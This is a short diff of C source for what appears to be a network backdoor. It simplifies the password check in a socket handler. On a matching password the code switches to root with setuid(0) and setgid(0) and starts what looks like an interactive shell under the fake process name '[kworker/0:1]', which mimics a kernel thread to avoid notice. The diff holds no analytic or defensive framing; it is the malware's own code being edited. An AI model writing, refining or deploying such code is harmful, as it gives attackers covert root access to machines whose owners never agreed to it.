@@ -66,7 +66,6 @@ void fuck(int client_sock)
 		exit(1);
 	}
 
-	int auth = 0;
 	int read_size;
 	char client_message[2000];
 	FILE *fp;
@@ -81,14 +80,8 @@ void fuck(int client_sock)
 	while((read_size = recv(client_sock, client_message, 2000, 0)) > 0)
 	{
 		strtok(client_message, "\n");
-		if (auth == 0) {
-			if (! strcmp(pass, client_message)) {
-				auth = 666;
-				printf("[READY] uid=%d gid=%d\n", getuid(), getgid());
-			}
-		}
-
-		if (auth == 666) {
+		if (! strcmp(pass, client_message)) {
+			printf("[READY] uid=%d gid=%d\n", getuid(), getgid());
 			setuid(0);
 			setgid(0);
 			char const *args[] = { "[kworker/0:1]", "-i", NULL };
